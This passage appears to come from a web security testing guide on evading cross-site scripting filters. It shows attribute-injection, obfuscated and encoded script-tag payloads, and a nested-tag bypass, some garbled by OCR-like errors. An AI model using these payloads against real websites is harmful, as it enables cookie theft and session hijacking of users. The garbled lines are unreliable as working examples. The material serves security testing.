@@ -1,0 +1,25 @@
+commonly filtered.
+For example, the web application could use the user input value to
+fill an attribute, as shown in the following code:
+<input type="text” name="state” value="INPUT_FROM_
+USER">
+Then an attacker could submit the following code:
+" onfocus="alert(document.cookie)
+Example 4: Different syntax or encoding
+In some cases it is possible that signature-based filters can be
+simply defeated by obfuscating the attack. Typically you can do
+this through the insertion of unexpected variations in the syntax
+or in the enconding. These variations are tolerated by browsers as
+valid HTML when the code is returned, and yet they could also be
+accepted by the filter.
+Following some examples:
+“><script >alert(document.cookie)</script >
+“><script >alert(document.cookie)</script >
+“%3cscript%3ealert(document.cookie)%3c/scripth3e
+Example 5: Bypassing non-recursive filtering
+Sometimes the sanitization is applied only once and it is not being
+performed recursively. In this case the attacker can beat the filter
+by sending a string containing multiple attempts, like this one:
+<scr<script>ipt>alert(document.cookie)</script>
+Example 6: Including external script
+Now suppose that developers of the t
